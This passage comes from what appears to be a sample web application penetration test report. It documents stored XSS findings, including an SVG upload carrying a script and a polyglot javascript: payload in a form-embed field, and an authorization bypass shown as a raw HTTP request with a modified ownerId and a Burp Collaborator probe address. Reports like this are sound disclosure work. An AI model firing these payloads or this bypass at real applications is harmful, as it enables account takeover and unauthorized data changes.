{"text": "https: blob: mediastream: data:; font-src https: data:; worker-src blob: Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Content-Disposition: attachment; filename=json.txt X-Content-Type-Options: nosniff Vary: Accept-Encoding\\n{\"id\":2350,\"name\":\"<h1 onclick=\\\"alert(1)\\\">test<\\/h1>\",\"email\":\"\",\"hasEmail\":false,\"phoneNumber\":\"\",\"verificationStatus\":\"unreviewe d\",\"mos\":null,\"hasAudio\":false,\"hasVideo\":false,\"browserName\":null,\"browserVersion\":null,\"isBrowserSuppo rted\":false,\"city\":\"<h1 onclick=\\\"alert(1)\\\">test<\\/h1>\",\"region\":null,\"country\":null,\"osName\":null,\"osVersion\":null,\"participantType\":\" main\",\"agencyId\":\"7\\/28\\/2021 12:34\",\"agencyUserId\":3402,\"assignedDiscussion\":null,\"notificationsOn\":false,\"autoTechCheckLink\":\"https:\\/ \\/{URL}\\/recruiting\\/videoResponse?recruitId=4be1087e-4172-4a9e-903f- 761c01deb8ce\",\"videoResponseLink\":null,\"recruitImageLink\":null,\"screenerLink\":\"\\/ajax\\/recruit\\/4be1087e- 4172-4a9e-903f- 761c01deb8ce\\/screener\",\"assignments\":[],\"availabilities\":[],\"isAgencyRecruit\":true,\"canBeUpdated\":true,\"ag encyName\":\"Assessor PPL1\",\"agencyEmail\":\"dev+assessor_purplesec.us@the company\",\"agencyPhoneNumber\":\"\",\"resubmittedAt\":null,\"techCheckLinkSent\":null,\"interviewInviteSent\":null ,\"techCheckStatus\":\"Not Sent\",\"techCheckNudgeSent\":false,\"inviteStatus\":null,\"dispositionHistory\":{\"conferences\":[],\"dispositions\":{} [...] The following screenshot shows the XSS executing in the browser after clicking on the First Name Field: Figure 2 - XSS Code Execution\\nInstance 3 It is possible to upload a malicious SVG file that will execute JavaScript on the application. Navigating to the Team Settings & Members page and clicking on any Upload Logo tab that allows SVG file extensions permits a malicious SVG to execute: Figure 3 - Malicious SVG File\\nThe following SVG payload was successfully uploaded: <svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\"> <rect width=\"300\" height=\"100\" style=\"fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)\" /> <script type=\"text/javascript\"> alert(\"document.domain\"); </script> </svg> Clicking the Upload tab option highlighted in the screenshot below temporarily stores the SVG: Figure 4 - Uploading Malicious SVG File\\nNavigating directly to the URL will trigger the XSS to execute: Figure 5 - Triggering XSS\\nNote, the malicious SVG file is also stored on a CloudFront server that is accessed by the application. Navigating directly to the CloudFront domain will also cause the XSS to execute: Figure 6 - Image Stored On CloudFront Server\\nInstance 4 It is possible to insert malicious JavaScript into the “Embed Project-Level Form” field using the following payload: jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1234) )//%0D%0A%0d%0a//////--!&gt;\\x3csVg/\\x3e The following screenshot shows the malicious JavaScript being saved into this field in the GUI: Figure 7 - Malicious JavaScript Stored In GUI\\nAfter saving the payload in the field highlighted above then navigating back to the application dashboard page, the XSS will execute when a user clicks the Set Up Session tab: Figure 8 - XSS Execution Via \"Set Up Session\" Tab\\nAuthorization Restriction Bypass Severity: High Access controls enforce policies such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification or destruction of all data, or performing a business function outside of the user's limits. Instance 1 It is possible to bypass application GUI authorization restrictions and arbitrarily create teams that belong to other application users. The assessor@purplesec.us user makes the following HTTP request. The HTTP request modifies the \"ownerId\" parameter from 3401 to 3402. This modification will arbitrarily assign the team to the dev+assessor_purplesec.us@the company user without their consent. Moreover, the request also adds the assessor@purplesec.us user as one of this new team's members: POST /ajax/team/create HTTP/2 Host: {URL} Cookie: <snip> User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@kd126yz624yclvld46y7azdqmhs8m2pqe.burpcollaborator.net Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate name=NOTREAL&isPublic=true&members%5B0%5D=assessor%40purplesec.us&ownerId=3402\\nDate: Wed, 28 Jul 2021 22:33:09 GMT Content-Type: application/json; charset=utf-8 Content-Length: 35 Server: Apache/2.4 Strict-Transport-Security: max-age=31536000; includeSubdomains X-Frame-Options: SAMEORIGIN X-Content-Type-Options: nosniff X-Xss-Protection: 1; mode=block Content-Security-Policy: default-src https: 'unsafe-eval' 'unsafe-inline'; object-src 'none'; connect-src *; img-src https: blob: mediastream: data:; font-src https: data:; worker-src blob: Access-Control-Allow-Origin: https://{URL} Access-Control-Allow-Credentials: true Access-Control-Allow-Methods: GET,POST,PUT,PATCH,DELETE,OPTIONS Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X- Requested-With Vary: Origin,Accept-Encoding Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Content-Disposition: attachment;", "metadata": {"doc_id": "Web-Application-Penetration-Test-Sample-Report", "chunk_id": 2}}